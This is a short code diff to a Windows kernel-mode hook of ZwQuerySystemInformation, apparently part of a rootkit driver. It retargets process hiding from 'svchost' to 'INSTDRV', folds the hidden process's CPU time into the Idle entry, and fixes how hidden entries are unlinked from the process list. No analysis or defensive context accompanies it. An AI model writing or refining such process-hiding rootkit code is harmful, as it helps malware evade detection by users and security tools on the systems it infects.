@@ -27,6 +27,7 @@ NTSTATUS NewZwQuerySystemInformation(
 {
 
 	NTSTATUS ntStatus;
+	BOOL curr_is_target = FALSE;
 
 	ntStatus = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (
 		SystemInformationClass,
@@ -51,8 +52,9 @@ NTSTATUS NewZwQuerySystemInformation(
 				//Ktrace("Current item is %x\n", curr);
 				if (curr->ProcessName.Buffer != NULL)
 				{
-					if (0 == memcmp(curr->ProcessName.Buffer, L"svchost", 14))
+					if (0 == memcmp(curr->ProcessName.Buffer, L"INSTDRV", 14))
 					{
+						curr_is_target = TRUE;
 						m_UserTime.QuadPart += curr->UserTime.QuadPart;
 						m_KernelTime.QuadPart += curr->KernelTime.QuadPart;
 
@@ -73,6 +75,8 @@ NTSTATUS NewZwQuerySystemInformation(
 							else // we are the only process!
 								SystemInformation = NULL;
 						}
+					}else {
+						curr_is_target = FALSE;
 					}
 				}
 				else // This is the entry for the Idle process
@@ -85,7 +89,9 @@ NTSTATUS NewZwQuerySystemInformation(
 					// Reset the timers for next time we filter
 					m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
 				}
-				prev = curr;
+				if (!curr_is_target) {
+					prev = curr;
+				}
 				if (curr->NextEntryDelta) ((char *)curr += curr->NextEntryDelta);
 				else curr = NULL;
 			}
